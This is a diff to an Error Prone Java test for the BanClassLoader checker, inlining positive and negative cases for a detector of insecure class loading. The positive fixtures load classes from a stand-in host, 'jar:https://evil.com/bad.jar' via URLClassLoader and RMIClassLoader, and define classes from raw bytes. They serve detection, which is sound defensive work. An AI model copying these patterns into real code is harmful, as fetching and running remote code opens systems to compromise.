@@ -33,11 +33,87 @@ public class BanClassLoaderTest {
 
   @Test
   public void positiveCase() {
-    compilationHelper.addSourceFile("testdata/BanClassLoaderPositiveCases.java").doTest();
+    compilationHelper
+        .addSourceLines(
+            "BanClassLoaderPositiveCases.java",
+            """
+package com.google.errorprone.bugpatterns.testdata;
+
+import static java.rmi.server.RMIClassLoader.loadClass;
+
+import java.lang.invoke.MethodHandles;
+import java.net.MalformedURLException;
+import java.net.URL;
+import java.net.URLClassLoader;
+
+class BanClassLoaderPositiveCases {
+  /** Override loadClass with an insecure implementation. */
+  // BUG: Diagnostic contains: BanClassLoader
+  class InsecureClassLoader extends URLClassLoader {
+    public InsecureClassLoader() {
+      super(new URL[0]);
+    }
+
+    @Override
+    protected Class<?> loadClass(String name, boolean resolve) throws ClassNotFoundException {
+      try {
+        addURL(new URL("jar:https://evil.com/bad.jar"));
+      } catch (MalformedURLException e) {
+      }
+      return findClass(name);
+    }
+  }
+
+  /** Calling static methods in java.rmi.server.RMIClassLoader. */
+  public static final Class<?> loadRMI() throws ClassNotFoundException, MalformedURLException {
+    // BUG: Diagnostic contains: BanClassLoader
+    return loadClass("evil.com", "BadClass");
+  }
+
+  /** Calling constructor of java.net.URLClassLoader. */
+  public ClassLoader loadFromURL() throws MalformedURLException {
+    // BUG: Diagnostic contains: BanClassLoader
+    URLClassLoader loader = new URLClassLoader(new URL[] {new URL("jar:https://evil.com/bad.jar")});
+    return loader;
+  }
+
+  /** Calling methods of nested class. */
+  public static final Class<?> methodHandlesDefineClass(byte[] bytes)
+      throws IllegalAccessException {
+    // BUG: Diagnostic contains: BanClassLoader
+    return MethodHandles.lookup().defineClass(bytes);
+  }
+}""")
+        .doTest();
   }
 
   @Test
   public void negativeCase() {
-    compilationHelper.addSourceFile("testdata/BanClassLoaderNegativeCases.java").doTest();
+    compilationHelper
+        .addSourceLines(
+            "BanClassLoaderNegativeCases.java",
+            """
+package com.google.errorprone.bugpatterns.testdata;
+
+import java.net.URL;
+import java.net.URLClassLoader;
+import java.security.SecureClassLoader;
+
+class BanClassLoaderPositiveCases {
+  /** OK to extend SecureClassLoader */
+  class AnotherSecureClassLoader extends SecureClassLoader {}
+
+  /** OK to call loadClass if it's not on RMIClassLoader */
+  public final Class<?> overrideClassLoader() throws ClassNotFoundException {
+    SecureClassLoader loader = new AnotherSecureClassLoader();
+    return loader.loadClass("BadClass");
+  }
+
+  /** OK to define loadClass */
+  private class NotClassLoader {
+    protected void loadClass() {}
+  }
+}""")
+        .doTest();
   }
 }
